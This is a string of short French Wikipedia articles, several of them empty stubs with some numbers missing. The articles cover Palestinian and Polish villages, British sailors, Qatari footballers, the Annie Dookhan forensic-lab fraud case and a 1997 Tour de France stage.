À Kufr sur, il y a deux écoles : l'école élémentaire à l'est et l'école secondaire mixte à l'ouest. Les étudiants de Kour viennent à Kufr Sour pour continuer leurs études parce qu'ils n'ont pas d'école secondaire dans leur village. En Palestine, les petites villages n’ont pas d’écoles secondaires à cause des petits effectifs. Pour passer les examens de baccalauréat les étudiants de Kufr Sour doivent aller à Kafr Jammal. Il existe aussi une école maternelle gérée par une association bénévole. Quant à l'enseignement supérieur, les étudiants de ce village partent chaque matin pour continuer leurs études universitaires à Tulkarm, à Naplouse, à Ramallah et dans d'autres villes .
Santé.
Une petite clinique médicale se trouve à l'ouest de la mosquée tandis qu'une pharmacie s'est installée à l'entrée du village. 

</doc>
<doc id="8978607" url="https://fr.wikipedia.org/wiki?curid=8978607" title="Waliny">
Waliny

Waliny (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978608" url="https://fr.wikipedia.org/wiki?curid=8978608" title="Bédia">
Bédia

Bédia (en arabe : بديا) est une ville de Palestine, en Cisjordanie, au nord de Jérusalem. Son nom est dérivé du mot araméen "biddah" signifiant pressoir d'huile d'olive, et "albid" désignant le lourd tronc utilisé pour presser les olives. Ce nom évoque le grand nombre d'oliviers cultivés alentour et l'importante production locale d'huile d'olive.
Géographie.
L'altitude de Bédia est d'environ . Sa superficie est de alors que la superficie totale des terres est d'environ , et celle les terres cultivées avec des oliviers est d'environ .
Localisation.
Située à au sud-ouest de Naplouse et à de Salfit, dans le nord de la Cisjordanie, Bédia est une ville palestinienne montagneuse. Elle se trouve sur la route principale menant à Kufr Kassem et à Jaffa. C'est la capitale du district de Salfit. 
Histoire.
En 1596, Bédia est apparue dans les registres fiscaux ottomans comme étant le Nahié du "Mont Qubal" dans le Sandjak de Naplouse. À cette époque, la ville se composait de huit foyers. Les villageois payaient des impôts sur le blé, l'orge, les oliviers, l'élevage et l'apiculture.
L'explorateur français Victor Guérin, passé par Bédia en 1870, l'a décrite comme un « village montagneux » d'une certaine importance. Dans "l'Arpentage de la Palestine occidentale" en 1882, Bédia a été décrite comme 
Mandat britannique.
Selon le recensement effectué en 1922 par les autorités du mandat britannique, Bédia avait une population de , tous musulmans, tandis que le recensement de 1931 Bédia (inclus Salita, une région qui se trouve dans la Sud de la ville) comptait occupées et une population de . En 1945, la population était de , tous palestiniens, alors que, selon un recensement officiel de la terre et de la population, la superficie totale des terres était . Sur ce total, étaient des terres irrigables et fertiles alloués à des plantations et pour la culture des céréales, alors que 47 dounoms ont été classés comme zones bâties.
1948-1967.
Dans la foulée de la guerre israélo-arabe de 1948, et après les accords d'armistice de 1949, Bédia a été placée sous la domination jordanienne.
Post-1967.
Après la guerre des Six-Jours en 1967, Bédia a été occupée par l’armée israélienne.
À la mi-2012, selon le Bureau Central Palestinien des statistiques, la population de Bédia était de (expatriés exclus).
Économie.
L'économie de Bédia dépend principalement de la culture des oliviers et de la production du savon de Naplouse similaire au savon d'Alep, principale industrie de la ville. Celle-ci dispose principalement des produits alimentaires issus de l'agriculture de subsistance ou des marchés d'alimentation locaux.
Avant le début de la deuxième Intifada, de nombreux habitants travaillaient dans les villes voisines, en particulier à Naplouse et à Ramallah, et chez des employeurs israéliens. La route principale traversant la ville, route 505 (faisant anciennement partie de la route Trans-Samarie), était bordée de nombreux magasins qui servaient des milliers d'acheteurs israéliens visitant la ville chaque semaine. Ces israéliens, les habitants des colonies israéliennes inclus, recherchaient des produits à bas prix. Le taux de chômage était d'environ 20 %, mais depuis l'Intifada, ce chiffre est passé à 78-90 %. Outre l'agriculture, certains habitants vivent de leurs économies et d'autres reçoivent de l’aide de la part de leurs proches installés à l’étranger .
Enseignement.
Enseignement scolaire.
La ville dispose d'établissements scolaires de différents niveaux :
Enseignement supérieur.
L'Université ouverte Al-Quds a ouvert une branche à Bédia.
Médias.
La ville dispose de la chaîne de télévision locale "Aljoud" et de la radio "Al-Ghad". Inaugurée en 2004, cette radio soutient les innovations et les projets et en assure la promotion.
Lieux et monuments.
Bédia compte de nombreux lieux de culte :
Bédia possède beaucoup de sites archéologiques, dont des tombeaux anciens parmi lesquels celui d'"Al-cheikh Ali Aldajani", le tombeau le plus célèbre. Celui-ci date du . C'est le tombeau de "Hamida Al-Rabi".
En outre, la ville abrite un étang ancien remontant à l'époque romaine et un puits rudimentaire, le "Beir Saleh".
Santé.
L'agglomération de Bédia possède plusieurs centres de santé : le centre de santé et de soin primaire et une société s'appelle "la société médicale scientifique", un centre privé de cliniques spécialisées, quatre cliniques médicales généralistes, trois cliniques médicales spécialisées (un centre de gynécologie, un centre privé de pédiatrie et une clinique de soins internes), trois laboratoires médicaux, un centre de protection maternelle et infantile géré par le Croissant-Rouge, un centre privé de physiothérapie, un centre de radiologie géré par une ONG de bienfaisance. En outre, la ville compte six pharmacies privées et deux ambulances.
En cas d'absence de services de santé nécessaires ou en cas d'urgence, les patients sont transférés à l'hôpital gouvernemental Yasser Arafat de Salfit (à de Bédia) ou à ceux de Naplouse (à de Bédia) et de Ramallah.
Infrastructure.
Électricité et télécommunications.
Bédia est connectée à un réseau public d'électricité depuis 1980. Elle est desservie par la compagnie d'électricité nationale israélienne qui représente la principale source d'électricité dans la ville. Environ 98,1 % des foyers dans la ville sont connectés au réseau. Les habitants de la ville sont confrontés à des problèmes concernant l'électricité, principalement le besoin de l'expansion de réseau électrique et la nécessité d'accroître sa puissance. Ces enjeux sont particulièrement problématiques en hiver. Bédia est également reliée à un réseau téléphonique. Environ 99,5 % des foyers dans les limites de la ville sont reliés à des lignes téléphoniques.
Transport.
Bédia compte 82 taxis et neuf bus publics. Toutefois, les résidents souffrent des monticules de terre sur les routes et des checkpoints militaires. Il y a sept kilomètres de routes principales et de routes secondaires.
Vie associative.
Bédia dispose de plusieurs institutions gouvernementales : un bureau de poste, une caserne de pompiers, un poste de police, le bureau du ministère de l'Intérieur, le bureau du ministère de l'Agriculture, le bureau du ministère du Travail et un bureau pour le ministère d'affaires sociales. La ville dispose également des institutions locales et des associations qui fournissent des services aux secteurs de la société comme :
Personnalités célèbres.
Le conseil municipal de Bédia a été fondé en 1997 par le Ministère du Gouvernement Local, avec l'objectif de prendre soin des problèmes de la ville et de fournir des services variés à ses habitants, comme les services d'infrastructure. Des élections se tiennent pour élire ses membres ainsi que le maire de la ville.
Les maires de Bédia depuis 2002 sont :

</doc>
<doc id="8978609" url="https://fr.wikipedia.org/wiki?curid=8978609" title="Kifl Hares">
Kifl Hares

Kifl Hares (en arabe : كفل حارس, prononcé "kifel hares") est un village palestinien au nord de la Cisjordanie, situé à au nord de Salfit et à  au sud-ouest de Naplouse. 
C'est un des villages qui a été placé sous l'occupation israélienne après la guerre de 1967. Le village dispose d'un club sportif, d'un cybercafé, d'une grande salle pour les fêtes de mariage et d'un grand parc agrémenté d'une piscine.
Étymologie.
Kifl Hares a deux noms : Tamnet Hares et Tamnet Sareh. Ce village a été appelé Tamnet Hares à cause de l'arrêt du soleil à l'époque du Prophète Joshua ("Yashou"). C'est pourquoi on a gravé le soleil sur son tombeau. La deuxième histoire de son appellation suppose que Kifl Hares a été nommé ainsi parce que le prophète Dhul Kifl y a été enterré. Cette histoire semble plus crédible. 
Géographie.
Kifl Hares est entouré par les villages de Deir Estia à l'ouest, de Qira à l'est, de Hares au sud-ouest, de Zêta et de Jamma'in au nord et de Marada au sud. La colonie d'Ariel a été créée en 1978 sur une grande partie de son territoire. Cette colonie a connu un essor spectaculaire au cours de ces dernières années. L'altitude du village est d'environ 500 mètres et sa superficie est d'environ dounams. 
Climat.
Le climat de Kifl Hares est méditerranéen. Il fait chaud et sec l'été et il fait froid et pluvieux l'hiver et le printemps est en fin de mars et début d'avril.  Juillet et août sont les mois les plus chauds de l'année (28.9 °C- 40 °C en moyenne) tandis que janvier est le mois le plus froid ( 3.9 °C en moyenne).
Population.
Kifl Hares compte environ  en 2015 selon le recensement réalisé par le bureau central palestinien des statistiques. La plupart de ses habitants sont des jeunes et des écoliers. Les habitants du village dépendent pour leur subsistance  des postes publiques et de la culture de la terre. 
Économie.
L'huile d'olive et les céréales sont les produits principaux de Kifl Hares. Il y a beaucoup d'arbres dans ce village comme les figuiers, les abricotiers et les pommiers. Kifl Hares possède plusieurs fermes de poulets et une ferme de vaches.
Sites religieux et historiques.
Kifl Hares dispose de beaucoup de monuments religieux. En outre, il abrite les tombeaux de plusieurs prophètes comme les tombeaux d'Élisée, de Josué et de Dhul Kifl. Le tombeaux de ce dernier est situé à côté de l'école secondaire de filles tandis que celui de Josué est situé dans le centre du village. Le village possède les ruines de Deir Bjal. De plus, il compte quatre mosquées.
Enseignement.
Il y a quatre écoles à Kifl Hares :
Santé.
Kifl Hares dispose d'une clinique médicale publique et de nombreuses cliniques privées. Le village compte un siège du Croissant-Rouge palestinien. Il y a aussi trois pharmacies.

</doc>
<doc id="8978610" url="https://fr.wikipedia.org/wiki?curid=8978610" title="Célidoine">
Célidoine



</doc>
<doc id="8978611" url="https://fr.wikipedia.org/wiki?curid=8978611" title="Shirley Robertson">
Shirley Robertson

Shirley Ann Robertson, née le à Dundee, est une navigatrice britannique.
Elle a gagné deux médailles d'or aux Jeux olympiques.
Biographie.
Shirley Robertson remporte la médaille d'or en classe Europe aux Jeux olympiques d'été de 2000. C'est la première médaille d’or en voile olympique en solitaire pour le Royaume-Uni, et la première médaille olympique pour une navigatrice britannique. Quatre ans plus tard, elle remporte une nouvelle médaille d'or en classe Europe aux Jeux olympiques d'été de 2004 avec Sarah Ayton et Sarah Webb. 
Elle est officier de l'ordre de l'Empire britannique.

</doc>
<doc id="8978612" url="https://fr.wikipedia.org/wiki?curid=8978612" title="Wawrzyszów (Mazovie)">
Wawrzyszów (Mazovie)

Wawrzyszów (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Wolanów (siège de la "gmina"), à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 300 habitants.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978614" url="https://fr.wikipedia.org/wiki?curid=8978614" title="Wawrzyszów">
Wawrzyszów

Wawrzyszów peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="8978615" url="https://fr.wikipedia.org/wiki?curid=8978615" title="Tarqumia">
Tarqumia

Tarqumia est une ville d'environ situé à  à l'ouest d'Hébron, près de Bayt Jibrin.
Sa superficie ne dépasse pas  hectares. 
Elle est composée de collines montagneuses et bâtie sur une colline de 350 à  d'altitude.
Histoire.
Son installation paraît ancienne, peut-être de l'époque du royaume de Juda (931-586 avant notre ère).
Ce serait l'ancienne , ville de la province byzantine de Palaestina Prima (390-636), un temps supposée (à tort) siège épiscopal dépendant du diocèse d'Antioche.
Cependant, de 1723 à 1926 (au moins), elle a été le siège d'un évêché catholique.

</doc>
<doc id="8978616" url="https://fr.wikipedia.org/wiki?curid=8978616" title="Wymysłów (Wolanów)">
Wymysłów (Wolanów)

Wymysłów (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village compte approximativement une population de 150 habitants.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978620" url="https://fr.wikipedia.org/wiki?curid=8978620" title="Zabłocie (Radom)">
Zabłocie (Radom)

Zabłocie (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Wolanów (siège de la "gmina"), à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978632" url="https://fr.wikipedia.org/wiki?curid=8978632" title="Goyen (homonymie)">
Goyen (homonymie)



</doc>
<doc id="8978635" url="https://fr.wikipedia.org/wiki?curid=8978635" title="Championnats d'Europe des régions de karaté 2009">
Championnats d'Europe des régions de karaté 2009



</doc>
<doc id="8978636" url="https://fr.wikipedia.org/wiki?curid=8978636" title="Z 56300">
Z 56300



</doc>
<doc id="8978639" url="https://fr.wikipedia.org/wiki?curid=8978639" title="William Webb">
William Webb



</doc>
<doc id="8978642" url="https://fr.wikipedia.org/wiki?curid=8978642" title="Championnats d'Europe des régions de karaté 2010">
Championnats d'Europe des régions de karaté 2010



</doc>
<doc id="8978646" url="https://fr.wikipedia.org/wiki?curid=8978646" title="Chris Draper">
Chris Draper

Chris Draper, né le à Sheffield, est un skipper britannique
Biographie.
Chris Draper remporte la médaille de bronze en 49er avec Simon Hiscocks aux Jeux olympiques d'été de 2004.

</doc>
<doc id="8978650" url="https://fr.wikipedia.org/wiki?curid=8978650" title="Mont Rantemario">
Mont Rantemario



</doc>
<doc id="8978652" url="https://fr.wikipedia.org/wiki?curid=8978652" title="Simon Hiscocks">
Simon Hiscocks

Simon Hiscocks, né le à Dorking, est un skipper britannique.
Biographie.
Avec Ian Barker, Simon Hiscocks est médaillé d'argent en 49er aux Jeux olympiques d'été de 2000. Il remporte ensuite la médaille de bronze en 49er avec Chris Draper aux Jeux olympiques d'été de 2004.

</doc>
<doc id="8978656" url="https://fr.wikipedia.org/wiki?curid=8978656" title="Ian Barker">
Ian Barker

Ian Barker, né le à Cardiff, est un skipper britannique.
Biographie.
Avec Simon Hiscocks, Ian Barker est médaillé d'argent en 49er aux Jeux olympiques d'été de 2000.

</doc>
<doc id="8978659" url="https://fr.wikipedia.org/wiki?curid=8978659" title="Monts Tanzawa">
Monts Tanzawa

Les sont une chaîne de montagnes située dans la région de Kantō au Japon. Ils couvrent la partie nord-ouest de la préfecture de Kanagawa et touchent aux limites préfectorales de la préfecture de Shizuoka à l'ouest et de la préfecture de Yamanashi au nord.

</doc>
<doc id="8978672" url="https://fr.wikipedia.org/wiki?curid=8978672" title="Fred Norris">
Fred Norris

Fred Norris (né le à Tyldesley et mort le à Tyldesley) était un athlète britannique spécialiste du marathon et des courses de fond.

</doc>
<doc id="8978678" url="https://fr.wikipedia.org/wiki?curid=8978678" title="Chin Han (né en 1946)">
Chin Han (né en 1946)



</doc>
<doc id="8978679" url="https://fr.wikipedia.org/wiki?curid=8978679" title="Sarre-Louis">
Sarre-Louis



</doc>
<doc id="8978680" url="https://fr.wikipedia.org/wiki?curid=8978680" title="Nébuleuse de la Barbe à papa">
Nébuleuse de la Barbe à papa

La nébuleuse de la Barbe à papa ("") est une protonébuleuse planétaire découverte à l'aide d'observations du satellite IRAS. Elle est un bon exemple de protonébuleuse planétaire de type DUPLEX.

</doc>
<doc id="8978681" url="https://fr.wikipedia.org/wiki?curid=8978681" title="Chin Han (né en 1969)">
Chin Han (né en 1969)



</doc>
<doc id="8978682" url="https://fr.wikipedia.org/wiki?curid=8978682" title="Motoei Shinzawa">
Motoei Shinzawa

 est un mangaka né le à Kashiwazaki, dans la préfecture de Niigata, au Japon. Il est surtout connu pour son manga Le collège fou, fou, fou.

</doc>
<doc id="8978685" url="https://fr.wikipedia.org/wiki?curid=8978685" title="Annie Dookhan">
Annie Dookhan

Annie Dookhan, née sous l'identité d'Annie Sadiyya Khan en 1977 à Trinité-et-Tobago, est une chimiste américaine qui, employée dans un laboratoire de police scientifique dans l'État du Massachusetts aux États-Unis et chargée de réaliser des tests génétiques en matière de produits stupéfiants pour la justice américaine, a reconnu avoir falsifié des dizaines de milliers de résultats.
Biographie.
Annie Sadiyya Khan naît à San Fernando à Trinidad et Tobago en 1977. Elle émigre aux États-Unis dans sa jeunesse et en a acquiert ensuite la nationalité.
En 2003, elle est embauchée comme chimiste par le "", situé près de Boston. Elle est spécialement chargée d'analyser des échantillons de produits stupéfiants.
Elle se marie avec Surrendranath Dookhan en 2004.
En , un chef de service chargé du contrôle des preuves au sein du laboratoire découvre qu'Annie Dookhan a récemment testé 95 échantillons sans les avoir manipulés. Des investigations poussées révèlent une fraude de grande ampleur, qui entraîne sa suspension administrative. Néanmoins, elle continue à pouvoir être entendue comme expert devant les juridictions judiciaires jusqu’en , date à laquelle elle est déchargée de toutes fonctions. Elle démissionne du laboratoire en .
L'enquête qui s'ensuit montre que les supérieurs de leur employée avaient négligé divers signaux d'alerte qui auraient dû éveiller leur attention : elle indiquait analyser 500 échantillons par mois, soit cinq fois plus que la moyenne habituelle de ses collègues ; on la voyait rarement devant son microscope ; elle effectuait des centaines d'analyses par mois alors qu'une part importante de son temps de travail était employé à se rendre devant les juridictions pour attester de la qualité de ses opérations techniques.
Par la suite, devant l'ampleur du scandale, le gouverneur du Massachusetts, Deval Patrick, ordonne la fermeture provisoire du laboratoire de police scientifique.
Annie Dookhan reconnaît les faits de fraude : échantillons non testés, échantillons partiellement testés, identifications visuelles sans tests chimiques, rajouts de produits stupéfiants à des échantillons sains.
Le , elle est arrêtée et poursuivie pour obstruction à la justice et falsification de données. On découvre aussi qu'elle n'était pas titulaire du diplôme universitaire de deuxième cycle qu'elle avait indiqué au moment de son embauche. Le suivant, elle est officiellement poursuivie pour 27 infractions.
Le , après avoir « plaidé coupable », elle est condamnée à une peine de trois à cinq années d'emprisonnement, suivies de deux ans de probation (le procureur avait sollicité une peine de cinq à sept ans d'emprisonnement). Elle est incarcérée sous le matricule F-81328 au centre de détention du Massachusetts de Framingham.
Impact de la fraude.
Plusieurs centaines de personnes ont été condamnées à la suite de données frauduleuses issues du travail d'Annie Dookhan. Une vingtaine de personnes sont suspectées d'avoir été relaxées à tort. Des procédures sont en cours contre l'État du Massachusetts pour « manquement du ministère public dans la loyauté des débats » et « violation des droits de la défense ».
La presse évoque 34 000 données falsifiées.
En , Benjamin Keehn, juriste au sein du "Committee for Public Counsel Services", déclare qu'environ 40 000 personnes pourraient avoir été condamnées sur la base des analyses erronées de Dookhan.

</doc>
<doc id="8978688" url="https://fr.wikipedia.org/wiki?curid=8978688" title="Guadarrama (commune)">
Guadarrama (commune)



</doc>
<doc id="8978693" url="https://fr.wikipedia.org/wiki?curid=8978693" title="Rouge Rubis (roman)">
Rouge Rubis (roman)



</doc>
<doc id="8978698" url="https://fr.wikipedia.org/wiki?curid=8978698" title="Force terrestre de l’émir du Qatar">
Force terrestre de l’émir du Qatar



</doc>
<doc id="8978703" url="https://fr.wikipedia.org/wiki?curid=8978703" title="Ibrahim Majid">
Ibrahim Majid

Ibrahim Majid Abdulmajid () (né le à Koweït City au Koweït) est un joueur de football international qatarien, qui évolue au poste de défenseur.
Biographie.
Carrière en club.
Il remporte la Ligue des champions de l'AFC en 2011 avec le club d'Al Sadd. Il participe ensuite à la Coupe du monde des clubs de la FIFA 2011 avec cette équipe, compétition lors de laquelle il se classe troisième.
Carrière en sélection.
Avec l'équipe du Qatar, il joue 77 matchs (pour 5 buts inscrits) depuis 2007 . 
Il figure dans le groupe des sélectionnés lors des coupes d'Asie des nations de 2007, de 2011 et de 2015. Il atteint les quarts de finale de cette compétition en 2011.
Il joue 12 matchs comptant pour les et 13 matchs comptant pour les .

</doc>
<doc id="8978712" url="https://fr.wikipedia.org/wiki?curid=8978712" title="Hestroumont">
Hestroumont

Hestroumont est un hameau de la commune belge de Theux située en Région wallonne dans la province de Liège.
Avant la fusion des communes de 1977, le hameau faisait partie de la commune de La Reid.
Situation.
Ce hameau se situe le long de la route descendant de La Reid à Spixhe près de Theux et sur les pentes douces du versant oriental du petit ruisseau de Thuron.
Description.
Hestroumont étire ses habitations le long de la route mentionnée ci-dessus dans un environnement de prairies. Le noyau ancien du hameau est formé par quelques maisons et fermettes construites en moellons de grès au cours du et du . Une des fermettes se trouve juste dans l'axe de la route. Elle est évitée par une chicane. 
De part et d'autre de la partie ancienne du hameau, des constructions plus récentes ont été bâties en s'implantant aussi le long de la même route. Quelques fermes isolées se trouvent à proximité du hameau.

</doc>
<doc id="8978731" url="https://fr.wikipedia.org/wiki?curid=8978731" title="Processidae">
Processidae

Les Processidae sont une famille de crustacés décapodes, la seule de la super-famille des Processoidea.
Liste des familles.
Selon :

</doc>
<doc id="8978733" url="https://fr.wikipedia.org/wiki?curid=8978733" title="Processoidea">
Processoidea



</doc>
<doc id="8978742" url="https://fr.wikipedia.org/wiki?curid=8978742" title="Talal Al Bloushi">
Talal Al Bloushi

Talal Hassan Ali Al Bloushi () (né le à Al Jahra au Koweït) est un joueur de football international qatarien, qui évolue au poste de milieu de terrain.
Biographie.
Carrière en club.
Il remporte la Ligue des champions en 2011 avec le club d'Al Sadd. Il participe ensuite à la Coupe du monde des clubs de la FIFA 2011 organisée au Japon.
Carrière en sélection.
Avec l'équipe du Qatar, il joue 66 matchs (pour un but inscrit) depuis 2006.
Il figure dans le groupe des sélectionnés lors des coupes d'Asie des nations de 2007 et de 2011. Il atteint les quarts de finale de cette compétition en 2011.
Il joue 14 matchs comptant pour les et 9 matchs comptant pour les .

</doc>
<doc id="8978749" url="https://fr.wikipedia.org/wiki?curid=8978749" title="Jan Pech">
Jan Pech

Jan Pech (-?) est un footballeur international bohémien, évoluant au poste de gardien de but.
Biographie.
Jan Pech honore sa première (et dernière) sélection avec l'équipe de Bohême et Moravie le contre la Hongrie (1-1).

</doc>
<doc id="8978753" url="https://fr.wikipedia.org/wiki?curid=8978753" title="Haëloc">
Haëloc

Haëloc de Domnomée est un prince breton puis roi de Domnonée du , évoqué dans la "Vita de saint Malo" composée vers 870.
Biographie.
Haëloc est un fils cadet de Judaël roi de Domnomée armoricaine. Il est confié à un père nourricier (latin: "nutritor") nommé Rethwal que la Vie de saint Malo qualifie d'hérétique. À la mort de leur père vers 605, le trône de Domnomée doit revenir à l'ainé de ses fils Judicaël. Rethwal qui souhaite régner au nom de son pupille décide de le porter au trône et fait massacrer sept des quinze frères d'Haëloc. Sept autres réussissent à s'échapper dont Judicaël l'héritier du trône qui se réfugie dans le monastère de Saint-Jean de Gaël et se fait moine sous la protection de l'abbé Méen. 
Après la mort subite de Rethwal, Haëloc règne seul et il s'oppose à l'abbé-évêque Maclou/Malo d'Alet en détruisant un petit établissement monastique c'est-à-dire une "Cellula" avec sa "basilica" située à « Raux », selon le biographe du saint, peut-être identifiable avec Roz-sur-Couesnon. Maclou et ses moines interviennent et à la suite de leur prières Haëloc devient aveugle. Il se rend au monastère de Maclou et se prosterne devant lui en déclarant accepter de grand cœur les pénitences qui lui seraient imposées. Touché par ce repentir, Maclou prie pour lui et il recouvre la vue. Il restitue alors vers 610 son héritage à Judicaël mais garde comme domaine la région de Brocéliande entourant Gaël qu'il dirige en bon chrétien jusqu'à sa mort vers 615 
Notes et références.
 

</doc>
<doc id="8978764" url="https://fr.wikipedia.org/wiki?curid=8978764" title="Nematocarcinoidea">
Nematocarcinoidea

Nematocarcinoidea est une super-famille de crustacés décapodes.
Liste des familles.
Selon :

</doc>
<doc id="8978774" url="https://fr.wikipedia.org/wiki?curid=8978774" title="Miloslav Jeník">
Miloslav Jeník

Miloslav Jeník, né le et mort le , est un footballeur international bohémien, évoluant au poste de gardien de but.
Biographie.
Miloslav Jeník reçoit ses deux sélections avec l'équipe de Bohême et Moravie : le contre la Hongrie (4-4), et le contre l'Angleterre (0-4).

</doc>
<doc id="8978780" url="https://fr.wikipedia.org/wiki?curid=8978780" title="Keith Hancock">
Keith Hancock

Keith Hancock, né le à Casino, est un joueur australien de tennis, huitième de finaliste de l'Open d'Australie 1974.
Carrière.
1/8 de finaliste de l'Open d'Australie 1974, il échoue face à Colin Dibley après une belle lutte 6-4, 4-6, 5-7, 7-5, 6-8.

</doc>
<doc id="8978783" url="https://fr.wikipedia.org/wiki?curid=8978783" title="La Première Légion (film, 1951)">
La Première Légion (film, 1951)

La Première Légion ("") est un film américain réalisé par Douglas Sirk, sorti en 1951.

</doc>
<doc id="8978784" url="https://fr.wikipedia.org/wiki?curid=8978784" title="Commission des affaires étrangères de l'Assemblée">
Commission des affaires étrangères de l'Assemblée



</doc>
<doc id="8978789" url="https://fr.wikipedia.org/wiki?curid=8978789" title="Ali Afif">
Ali Afif

Ali Hassan Afif Yahya () (né le à Doha au Qatar) est un footballeur international qatarien, qui évolue au poste d'attaquant.
Biographie.
Carrière en club.
Il remporte la Ligue des champions de l'AFC en 2011 avec le club d'Al Sadd. Il participe ensuite à la Coupe du monde des clubs de la FIFA 2011 organisée au Japon.
Carrière en sélection.
Avec l'équipe du Qatar, il joue 39 matchs (pour 6 buts inscrits) entre 2007 et 2013.
Il figure dans le groupe des sélectionnés lors des coupes d'Asie des nations de 2007 et de 2011. Il atteint les quarts de finale de cette compétition en 2011.
Il dispute également quatre matchs comptant pour les .
Il joue enfin la Coupe du monde des moins de 17 ans 2005 organisée au Pérou.

</doc>
<doc id="8978791" url="https://fr.wikipedia.org/wiki?curid=8978791" title="Emily Chebet Muge">
Emily Chebet Muge



</doc>
<doc id="8978792" url="https://fr.wikipedia.org/wiki?curid=8978792" title="Reine de Paris">
Reine de Paris



</doc>
<doc id="8978793" url="https://fr.wikipedia.org/wiki?curid=8978793" title="15e étape du Tour de France 1997">
15e étape du Tour de France 1997

La quinzième étape du Tour de France 1997 s'est déroulée le entre Courchevel et Morzine sur un parcours de . L'Italien Marco Pantani remporte sa seconde étape sur ce Tour de France devant le Français Richard Virenque et l'Allemand Jan Ullrich.
Classement général.
Avec sa seconde victoire d'étape sur cette édition, l'Italien Marco Pantani (Mercatone Uno) reprend sa place sur le podium provisoire du classement général au détriment du Danois Bjarne Riis (Deutsche Telekom) qui se retrouve quatrième. Les deux leaders ayant finis dans le même temps à plus qu'une minute du vainqueur de l'étape, l'Allemand Jan Ullrich (Deutsche Telekom) domine toujours le classement général devant le Français Richard Virenque (Festina-Lotus) avec un écart stabilisé à six minutes et 22 secondes. Fernando Escartín (Kelme-Costa Blanc-Eurosport) gagne encore une place pour se retrouver cinquième devant Abraham Olano (Banesto). Autre changement, le Suisse Laurent Dufaux (Festina) perd deux places et voit lui passer devant José María Jiménez (Banesto) et Roberto Conti (Mercatone Uno).
Classements annexes.
Classement par points.
À la suite de cette étape de montagne où les leaders ont très peu marqués de points, profitant seulement des sprints intermédiaires en début d'étape pour s'expliquer, l'Allemand Erik Zabel (Deutsche Telekom) est toujours en tête du classement par points. Avec 288 points, le porteur du maillot vert devance le Français Frédéric Moncassin (Gan) de 93 points et le Néerlandais Jeroen Blijlevens de 120 points. Cependant, grâce au points engendrés depuis plusieurs étapes de montagne, les deux leaders du classement général, Jan Ullrich (Deutsche Telekom) et Richard Virenque (Festina-Lotus) font leurs entrées dans le top 5 du classement, respectivement quatrième et cinquième.
Classement du meilleur grimpeur.
Avec encore le plein de points fait (118 nouvelles unités à son compteur), le Français Richard Virenque (Festina-Lotus) creuse toujours plus son avance en tête du classement du meilleur grimpeur. Il devance toujours le leader du classement général l'Allemand Jan Ullrich (Deutsche Telekom) qui pointe avec un retard de près de 200 points. Le nouveau troisième du classement est l'Italien Francesco Casagrande (Saeco-Estro) à plus de 250 points du leader.
Classement du meilleur jeune.
Toujours leader du classement général, l'Allemand Jan Ullrich (Deutsche Telekom) l'est également au classement du meilleur jeune. Il continue a creuser les écarts sur ses plus proches poursuivants. Il devance toujours l'Autrichienl Peter Luttenberger (Rabobank) mais avec maintenant pluq d'une demi-heure minutes d'avance. Petit changement cependant, le Finlandais Joona Laukka (Festina) perd plus de vingt minutes sur les leaders et sort du top 5 au détriment du Français Laurent Roux (TVM-Farm Frites), cinquième à plus d'une heure du leader.
Classement par équipes.
Le chassé-croisé entre l'équipe française Festina-Lotus et l'italienne Mercatone Uno continue. Avec la notamment la victoire de Marco Pantani, les italiens reprenne la seconde place du classement. Le classement est toujours dominé par l'équipe allemande Deutsche Telekom qui possède près de douze minutes sur sa dauphine alors que les français sont mintenant relégués à plus d'une demi-heure des leaders.

</doc>
<doc id="8978794" url="https://fr.wikipedia.org/wiki?curid=8978794" title="Rhynchocinetes">
Rhynchocinetes

Rhynchocinetes est un genre de crevette de la famille des Rhynchocinetidae.
Liste des espèces.
Selon :

</doc>
<doc id="8978795" url="https://fr.wikipedia.org/wiki?curid=8978795" title="Monts Hakkoda">
Monts Hakkoda



</doc>
<doc id="8978800" url="https://fr.wikipedia.org/wiki?curid=8978800" title="William Rose (affichiste)">
William Rose (affichiste)

William Rose, né en 1909, est un artiste peintre spécialisé dans les affiches de cinéma. 
Biographie.
Sous contrat pour la Radio-Keith-Orpheum Pictures William Rose est à l'origine des affiches des films les plus célèbres, tous genres confondus, tel que "Sur les ailes de la danse" ("Swing Time", 1936), "Citizen Kane" (1941), "La Féline" ("Cat People", 1942) et "La Griffe du passé" ("Out of the Past", 1947).
Randolph Hearst l'engagea comme illustrateur pour son hebdomadaire dominical, "". Pour ce magazine, les œuvres de William Rose furent publiées à raison d'une par semaine. Il réalisa des illustrations pour des films, des pièces de théâtre, mais également des récits historiques ou romantiques.
William Rose produisit également pour d'autres éditeurs, notamment pour les magazines "Collier's Weekly", "Today's Woman" et "This Week". Il réalisa des illustrations de couverture de livres de poche pour "Avon", ', "Dell Publishing", "Permabooks", ' et "Pyramid Books".

</doc>
<doc id="8978803" url="https://fr.wikipedia.org/wiki?curid=8978803" title="Apollodore de Caryste">
Apollodore de Caryste



</doc>
<doc id="8978807" url="https://fr.wikipedia.org/wiki?curid=8978807" title="Giovanni Agostino Perotti">
Giovanni Agostino Perotti

Giovanni Agostino Perotti, né le à Verceil et mort à Venise le , est un compositeur et maître de chapelle italien.
Biographie.
